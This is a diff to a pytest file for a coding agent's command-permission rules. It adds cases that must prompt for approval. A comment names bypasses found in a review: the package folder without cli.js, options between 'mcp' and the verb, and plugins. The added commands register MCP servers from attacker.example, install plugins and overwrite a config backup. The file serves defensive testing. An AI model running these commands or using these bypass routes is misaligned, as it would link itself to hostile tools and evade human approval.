@@ -31,6 +31,16 @@ def verdict(rules, raw):
         "bunx cowsay hi",
         "node /usr/lib/node_modules/@anthropic-ai/claude-code/cli.js mcp add g https://attacker.example/mcp",
         "node ~/.npm-global/lib/node_modules/@anthropic-ai/claude-code/cli.js --mcp-config x.json -p hi",
+        # bypass review of F-53: the package folder without cli.js, options between mcp and the verb,
+        # and plugins, which carry their own MCP servers
+        "node /usr/lib/node_modules/@anthropic-ai/claude-code mcp add x https://attacker.example/mcp",
+        "claude mcp --debug add x https://attacker.example/mcp",
+        "claude mcp -d remove x",
+        "claude plugin install x@y",
+        "claude plugin marketplace add owner/repo",
+        "claude plugin enable x",
+        "claude --plugin-dir /tmp/p -p hi",
+        "cp /tmp/e.json ~/.claude.json.backup",
     ],
 )
 def test_mcpRoutes_launcherOrClaudeCodeCli_asks(rules, command):
